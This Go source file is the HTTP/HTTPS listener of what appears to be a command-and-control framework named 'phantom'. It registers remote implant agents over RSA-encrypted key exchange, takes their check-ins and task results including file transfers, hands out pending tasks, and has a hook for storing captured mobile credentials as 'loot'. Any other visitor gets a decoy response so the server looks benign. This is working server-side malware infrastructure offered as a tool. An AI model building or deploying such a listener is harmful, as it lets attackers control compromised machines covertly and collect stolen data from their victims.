package listener

import (
	"context"
	"crypto/rsa"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/phantom-c2/phantom/internal/agent"
	"github.com/phantom-c2/phantom/internal/db"
	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/task"
)

// EventCallback is called when notable events occur (agent registration, check-in, etc.).
type EventCallback func(event string, args ...interface{})

// HTTPListener handles HTTP/HTTPS C2 communications.
type HTTPListener struct {
	ID         string
	Name       string
	Type       string // "http" or "https"
	BindAddr   string
	Profile    *Profile
	TLSCert    string
	TLSKey     string

	server     *http.Server
	privKey    *rsa.PrivateKey
	agentMgr   *agent.Manager
	taskDisp   *task.Dispatcher
	onEvent    EventCallback
	running    bool
	database   interface{ InsertLoot(l *db.LootRecord) error }
}

// ListenerConfig holds the configuration for creating a new listener.
type ListenerConfig struct {
	ID       string
	Name     string
	Type     string
	BindAddr string
	Profile  *Profile
	TLSCert  string
	TLSKey   string
	PrivKey  *rsa.PrivateKey
	AgentMgr *agent.Manager
	TaskDisp *task.Dispatcher
	OnEvent  EventCallback
	Database interface{ InsertLoot(l *db.LootRecord) error } // For mobile cred capture
}

// NewHTTPListener creates a new HTTP/HTTPS listener.
func NewHTTPListener(cfg ListenerConfig) *HTTPListener {
	return &HTTPListener{
		ID:       cfg.ID,
		Name:     cfg.Name,
		Type:     cfg.Type,
		BindAddr: cfg.BindAddr,
		Profile:  cfg.Profile,
		TLSCert:  cfg.TLSCert,
		TLSKey:   cfg.TLSKey,
		privKey:  cfg.PrivKey,
		agentMgr: cfg.AgentMgr,
		taskDisp: cfg.TaskDisp,
		onEvent:  cfg.OnEvent,
		database: cfg.Database,
	}
}

// Start begins listening for connections.
func (l *HTTPListener) Start() error {
	mux := http.NewServeMux()

	// Register C2 routes
	mux.HandleFunc(l.Profile.RegisterURI, l.handleRegister)
	mux.HandleFunc(l.Profile.CheckInURI, l.handleCheckIn)

	// Decoy routes
	for _, uri := range l.Profile.DecoyURIs {
		mux.HandleFunc(uri, l.handleDecoy)
	}

	// Mobile agent endpoints (plain JSON — no encryption)
	if l.database != nil {
		mobileDB, _ := l.database.(*db.Database)
		if mobileDB != nil {
			mobileHandler := NewMobileHandler(l.agentMgr, l.taskDisp, mobileDB, l.onEvent)
			mobileHandler.RegisterRoutes(mux)
		}
	}

	// Catch-all for any other request
	mux.HandleFunc("/", l.handleDecoy)

	l.server = &http.Server{
		Addr:         l.BindAddr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	l.running = true
	l.emitEvent("listener_start", l.Name, l.Type, l.BindAddr)

	var err error
	if l.Type == "https" {
		err = l.server.ListenAndServeTLS(l.TLSCert, l.TLSKey)
	} else {
		err = l.server.ListenAndServe()
	}

	if err != nil && err != http.ErrServerClosed {
		l.running = false
		return err
	}
	return nil
}

// Stop gracefully shuts down the listener.
func (l *HTTPListener) Stop() error {
	l.running = false
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	l.emitEvent("listener_stop", l.Name)
	return l.server.Shutdown(ctx)
}

// IsRunning returns whether the listener is active.
func (l *HTTPListener) IsRunning() bool {
	return l.running
}

// handleRegister processes agent registration requests.
func (l *HTTPListener) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		l.serveDecoy(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20)) // 1MB limit
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Unwrap HTTP JSON wrapper
	env, err := protocol.UnwrapFromHTTP(body)
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	if env.Type != protocol.MsgRegisterRequest {
		l.serveDecoy(w, r)
		return
	}

	// RSA decrypt to get session key + registration payload
	sessionKey, regPayload, err := crypto.UnpackKeyExchange(l.privKey, env.Payload)
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Deserialize registration request
	var regReq protocol.RegisterRequest
	if err := protocol.Unmarshal(regPayload, &regReq); err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Get external IP
	externalIP := extractIP(r)

	// Register the agent
	agentRecord, err := l.agentMgr.Register(&regReq, sessionKey, externalIP, l.ID)
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	l.emitEvent("agent_register", agentRecord.Name, agentRecord.OS, agentRecord.Hostname, agentRecord.Username, externalIP)

	// Build response
	regResp := protocol.RegisterResponse{
		AgentID: agentRecord.ID,
		Name:    agentRecord.Name,
		Sleep:   agentRecord.Sleep,
		Jitter:  agentRecord.Jitter,
	}

	respPayload, err := protocol.Marshal(regResp)
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	// Encrypt response with session key
	respEnv, err := protocol.SealEnvelope(protocol.MsgRegisterResponse, sessionKey, respPayload)
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	httpResp, err := protocol.WrapForHTTP(respEnv, time.Now().Unix())
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	l.writeResponse(w, httpResp)
}

// handleCheckIn processes agent check-in requests.
func (l *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		l.serveDecoy(w, r)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 10<<20)) // 10MB limit for file transfers
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Unwrap HTTP JSON wrapper
	env, err := protocol.UnwrapFromHTTP(body)
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Find session key by KeyID
	agentID, sessionKey, found := l.agentMgr.FindAgentByKeyID(env.KeyID)
	if !found {
		l.serveDecoy(w, r)
		return
	}

	// Decrypt envelope
	plaintext, err := protocol.OpenEnvelope(env, sessionKey)
	if err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Deserialize check-in
	var checkIn protocol.CheckInRequest
	if err := protocol.Unmarshal(plaintext, &checkIn); err != nil {
		l.serveDecoy(w, r)
		return
	}

	// Update last seen
	l.agentMgr.CheckIn(agentID)

	// Process any results
	for _, result := range checkIn.Results {
		result.AgentID = agentID
		l.taskDisp.ProcessResult(&result)
		l.emitEvent("task_result", agentID, result.TaskID)
	}

	// Get pending tasks
	tasks, err := l.taskDisp.GetPendingTasks(agentID)
	if err != nil {
		tasks = nil
	}

	// Build response
	resp := protocol.CheckInResponse{Tasks: tasks}
	respPayload, err := protocol.Marshal(resp)
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	respEnv, err := protocol.SealEnvelope(protocol.MsgCheckInResponse, sessionKey, respPayload)
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	httpResp, err := protocol.WrapForHTTP(respEnv, time.Now().Unix())
	if err != nil {
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	l.writeResponse(w, httpResp)
}

// handleDecoy serves fake responses to non-agent traffic.
func (l *HTTPListener) handleDecoy(w http.ResponseWriter, r *http.Request) {
	l.serveDecoy(w, r)
}

// serveDecoy writes the decoy response with profile headers.
func (l *HTTPListener) serveDecoy(w http.ResponseWriter, r *http.Request) {
	headers := l.Profile.ResolveHeaders()
	for k, v := range headers {
		w.Header().Set(k, v)
	}
	w.Header().Set("Content-Type", l.Profile.ContentType)
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(l.Profile.DecoyResponse))
}

// writeResponse writes a C2 response with profile headers.
func (l *HTTPListener) writeResponse(w http.ResponseWriter, data []byte) {
	headers := l.Profile.ResolveHeaders()
	for k, v := range headers {
		w.Header().Set(k, v)
	}
	w.Header().Set("Content-Type", l.Profile.ContentType)
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

// emitEvent sends an event to the callback if registered.
func (l *HTTPListener) emitEvent(event string, args ...interface{}) {
	if l.onEvent != nil {
		l.onEvent(event, args...)
	}
}

// extractIP gets the client IP from the request.
func extractIP(r *http.Request) string {
	// Check X-Forwarded-For first (behind proxy)
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}

	// Check X-Real-IP
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}

	// Fall back to RemoteAddr
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return ip
}
